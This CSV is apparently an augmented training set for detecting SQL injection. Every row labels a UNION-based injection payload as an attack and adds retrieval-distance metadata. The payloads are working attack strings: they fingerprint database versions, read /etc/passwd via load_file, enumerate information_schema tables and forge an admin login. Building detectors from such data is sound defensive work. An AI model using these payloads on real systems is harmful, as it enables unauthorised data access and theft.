id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001860,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,2.472216038044871
SMOTE_001861,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,2.8701948273699074
SMOTE_001862,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.3231864682103903
SMOTE_001863,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000014,0.4742732530506785
SMOTE_001864,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,1.1242183914698305
SMOTE_001865,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.3392478041493894
SMOTE_001866,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,2.6369457956447624
SMOTE_001867,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.162152636119463
SMOTE_001868,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.8388155651164126
SMOTE_001869,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,0.1524522740393599
SMOTE_001870,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,1.203774803825755
SMOTE_001871,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.35913212889122126
SMOTE_001872,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.7108615049061198
SMOTE_001873,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.7562919569348272
SMOTE_001874,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,0.3328611622187964
SMOTE_001875,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000002,0.8682086406834743
SMOTE_001876,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,1.4453196525268819
SMOTE_001877,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.8073898468339566
SMOTE_001878,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,0.5275128676508358
SMOTE_001879,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.8295572924110983
SMOTE_001880,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.9532106322499746
SMOTE_001881,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,0.9771840008391256
SMOTE_001882,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000003,3.1234200174277666
SMOTE_001883,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.344048520927749
SMOTE_001884,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.4852235721357636
SMOTE_001885,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.1106719061832857
SMOTE_001886,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.9266669308298427
SMOTE_001887,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,0.7966639648782445
SMOTE_001888,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.4171456411809676
SMOTE_001889,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,1.6238390366114421
SMOTE_001890,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,1.32907028176754
SMOTE_001891,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.8176237969735871
SMOTE_001892,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.34004027268678494
SMOTE_001893,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.34570011884162466
SMOTE_001894,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.9822315946341107
SMOTE_001895,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.4960579242756065
SMOTE_001896,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,1.7027319261320426
SMOTE_001897,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,0.9767742701710282
SMOTE_001898,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000003,2.0633051076044193
SMOTE_001899,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.7223212549463235
SMOTE_001900,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.719313198271727
SMOTE_001901,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000019,1.9274738638146818
SMOTE_001902,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.3072434112817073
SMOTE_001903,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.21305029189196795
SMOTE_001904,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,1.1081388790293925
SMOTE_001905,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,1.4603964695371636
SMOTE_001906,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,4.792748671487662
SMOTE_001907,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,0.05267841949586123
SMOTE_001908,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.5927437854784301
SMOTE_001909,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.3759488184441746
SMOTE_001910,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000030,0.584630706671719
SMOTE_001911,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000017,0.04228507737023483
SMOTE_001912,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.08881465381702623
SMOTE_001913,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,4.16247384111486
SMOTE_001914,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,0.3155351944902018
SMOTE_001915,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.7732810214113554
SMOTE_001916,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,0.8918568078530854
SMOTE_001917,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000027,1.369699858380268
SMOTE_001918,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000004,4.432626512985782
SMOTE_001919,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,3.6465126872665428
SMOTE_001920,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,2.4597992237278734
SMOTE_001921,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,1.0950505014110319
SMOTE_001922,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,1.1090231285267578
SMOTE_001923,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.5644298957556124
SMOTE_001924,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.9879619247851394
SMOTE_001925,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,3.312071829007443
SMOTE_001926,attack,union,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",nearest_attack_euclidean,R000011,1.9871103393004221
SMOTE_001927,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,5.2777155263978015
SMOTE_001928,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,1.5561551136773062
SMOTE_001929,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,2.4529198091103694
SMOTE_001930,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.3774710847606784
SMOTE_001931,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,1.4755658648223842
SMOTE_001932,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.8912667784739163
SMOTE_001933,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,4.436172844562367
SMOTE_001934,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000005,0.6397937757749704
SMOTE_001935,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,0.983770655070303
SMOTE_001936,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000023,0.28083880973449393
SMOTE_001937,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000026,0.5101197992081402
SMOTE_001938,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,0.8428939100000593
SMOTE_001939,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000016,1.0581100464396294
SMOTE_001940,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,2.217199244360143
SMOTE_001941,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.6275511884268753
SMOTE_001942,attack,union,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000010,0.20894237261218462
SMOTE_001943,attack,union," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000007,2.0264843126016756
SMOTE_001944,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000006,1.0888626442033964
SMOTE_001945,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000022,2.2998317448843295
SMOTE_001946,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000018,0.24861969244015414
SMOTE_001947,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000024,0.35314833518287303
SMOTE_001948,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000015,0.2564653389980372
SMOTE_001949,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000031,0.17807357833663529
SMOTE_001950,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000013,1.4160109418383553
SMOTE_001951,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.9190366015054937
SMOTE_001952,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000029,0.15970714319609872
SMOTE_001953,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,1.7382043327901011
SMOTE_001954,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000008,2.780929066884108
SMOTE_001955,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000020,0.47154110710522706
SMOTE_001956,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R000028,2.3112254163907533
SMOTE_001957,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000012,1.3910026093637453
SMOTE_001958,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000021,1.2781996742039163
